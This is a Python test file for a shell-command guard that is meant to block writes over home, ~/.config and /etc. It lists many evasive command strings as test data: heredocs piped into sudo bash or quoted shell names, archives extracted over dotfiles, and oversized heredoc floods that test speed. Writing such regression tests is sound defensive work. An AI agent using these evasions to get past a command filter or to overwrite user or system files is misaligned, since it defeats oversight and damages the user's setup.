    "unzip -o /tmp/x.zip -d $\"$HOME\"", "rsync -a /tmp/p/ $\"$HOME/\"",
    "cp -r /tmp/p/. $\"$HOME\"", "cp -r /tmp/nvim ~/.config$\"\"/",
    "cp -r /tmp/nvim ~/.config/$\"\"", "mv /tmp/nvim ~/.config/$\"\"",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj", "/home/u"])
def test_r13_gated(cmd, cwd):
    assert _ours(rules.rule_editor_startup_protect(_sh_cwd(cmd, cwd), EMPTY)), (cmd, cwd)
    assert evaluate(_sh_cwd(cmd, cwd), EMPTY).action != Action.ALLOW, (cmd, cwd)


def test_r13_relative_mv_aside_with_home_cwd():
    cmd = "mv .config /tmp/o && mv /tmp/p .config"
    assert _ours(evaluate(_sh_cwd(cmd, "/home/u"), EMPTY))


@pytest.mark.parametrize("cmd", [
    "eval \"$(ssh-agent -s)\"", "eval \"$(direnv hook bash)\"", "eval $(minikube docker-env)",
    "bash <<'EOF'\necho hello\nnpm test\nEOF", "cat <<'EOF' > notes.md\ncp -r a ~/.config\nEOF",
    "mv ~/.config/foo.toml{,.bak}", "python - <<'EOF'\nprint(1)\nEOF",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj"])
def test_r13_false_positives(cmd, cwd):
    assert evaluate(_sh_cwd(cmd, cwd), EMPTY).rule != RULE, (cmd, cwd)


# ---- QA round 14 regressions --------------------------------------------------

_B14 = "\ncd ~/.config && git clone https://x/nvim\nEOF"


@pytest.mark.parametrize("cmd", [
    "sudo bash <<'EOF'" + _B14, "env bash <<'EOF'" + _B14, "env -i bash <<'EOF'" + _B14,
    "FOO=1 bash <<'EOF'" + _B14, "time bash <<'EOF'" + _B14, "command bash <<'EOF'" + _B14,
    "nice -n 5 sh <<'EOF'" + _B14, "cat <<'EOF' | sudo -u me bash" + _B14,
    "sudo bash <<'EOF'\ncd ~\ntar xf /tmp/x.tgz\nEOF",
    "timeout 60 bash <<'EOF'\ntar xf /tmp/x.tgz -C ~\nEOF",
    "/usr/bin/env bash <<'EOF'\nrsync -a /tmp/p/ ~/\nEOF",
    "sudo -u root bash -s <<'EOF'\ncp -r /tmp/p/. ~\nEOF",
    "nohup bash <<'EOF'\ncp -r /tmp/p/. ~\nEOF", "exec bash <<'EOF'\ncp -r /tmp/p/. ~\nEOF",
    "sudo bash <<'EOF'\ncp -r /tmp/p/. /etc/\nEOF",
    "cat <<'EOF' | sudo -E bash\ntar xf /tmp/x.tgz -C /\nEOF",
    "sudo bash <<<'cd; tar xf /tmp/x.tgz'",
    "bash -c \"$(cat <<'EOF'\ncp -r /tmp/p/. ~\nEOF\n)\"",
    "sudo bash -c \"$(cat <<'EOF'\ncp -r /tmp/p/. ~\nEOF\n)\"",
    "printf '%s\\n' 'cp -r /tmp/p/. ~' | sh",
    "cat <<'EOF' |& bash\ncp -r /tmp/p/. ~\nEOF", "cat <<'EOF' | sudo -i\ncp -r /tmp/p/. ~\nEOF",
    "cat <<'EOF' | fish\ncp -r /tmp/p/. ~\nEOF",
    "mv {" + ",".join(f"a{i}" for i in range(65)) + ",~/.config} /tmp/o && mv /tmp/p ~/.config",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj"])
def test_r14_gated(cmd, cwd):
    assert evaluate(_sh_cwd(cmd, cwd), EMPTY).action != Action.ALLOW, (cmd[:60], cwd)
    assert _ours(rules.rule_editor_startup_protect(_sh_cwd(cmd, cwd), EMPTY)), (cmd[:60], cwd)


@pytest.mark.parametrize("cmd", [
    "sudo bash <<'EOF'\napt-get update\nmkdir -p ~/.config/myapp\nEOF",
    "cat <<'EOF' | sudo tee /etc/apt/sources.list.d/x.list\ndeb http://x stable main\nEOF",
    "printf '%s\\n' a b c | sort", "sudo -u postgres psql <<'EOF'\nselect 1;\nEOF",
])
@pytest.mark.parametrize("cwd", [None, "/home/u/proj"])
def test_r14_false_positives(cmd, cwd):
    assert evaluate(_sh_cwd(cmd, cwd), EMPTY).rule != RULE, (cmd[:60], cwd)


# ---- QA round 15 regressions --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cat" + " <<EOF" * 4 + "|true" * 1000 + "\nx\nEOF\n" * 4,
    "cat" + " <<EOF" * 6 + "|true" * 1200 + "\nx\nEOF\n" * 6,
    "cat" + " <<EOF" * 5 + "|x" * 1200 + "\nhi\n" + "EOF\n" * 5,
    "cat" + " <<EOF" * 40 + "|x" * 1500 + "\n" + "hi\nEOF\n" * 40,
])
def test_r15_stacked_heredoc_pipes_fast(cmd):
    import time
    t = time.time()
    rules.rule_editor_startup_protect(_shell(cmd), EMPTY)
    assert time.time() - t < 1.0


def test_r15_pipe_into_wrapped_shell_still_gated():
    cmd = "cat <<'EOF' | tee /tmp/log | sudo -E bash\ncp -r /tmp/p/. ~\nEOF"
    assert _ours(evaluate(_shell(cmd), EMPTY))


# ---- QA round 16 regressions --------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cd ~ && tar xf /tmp/dots.tgz\n" + "sudo " * 1700 + "<<''" * 22306 + "|sudo" * 255,
    "sudo " * 2000 + "<<''" * 22250,
    "cat" + " <<E" * 12500 + ("|" + " sudo" * 38) * 255,
    "sudo " * 2000 + "<<<''" * 17800,
])
def test_r16_heredoc_operator_flood_fast(cmd):
    import time
    t = time.time()
    rules.rule_editor_startup_protect(_shell(cmd), EMPTY)
    assert time.time() - t < 1.0


@pytest.mark.parametrize("cmd", [
    "cat <<EOF | bash>/dev/null\ncd ~/.config && tar xf /tmp/n.tgz\nEOF",
    "cat <<EOF | (bash)\ncd ~/.config && tar xf /tmp/n.tgz\nEOF",
    "cat <<EOF|(sudo -E bash)\ncd /etc && tar xf /tmp/v.tgz\nEOF",
    "cat <<EOF | sudo -u \"my user\" bash\ncd ~ && tar xf /tmp/d.tgz\nEOF",
    "cat <<EOF | 2>/dev/null bash\ncp -r /tmp/p/. ~\nEOF",
    "cat <<EOF | b'a'sh\ncp -r /tmp/p/. ~\nEOF", "cat <<EOF | $'bash'\ncp -r /tmp/p/. ~\nEOF",
    "cat <<EOF | ( sudo bash )\ncp -r /tmp/p/. ~\nEOF",
])
def test_r16_wrapped_pipe_shells_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd
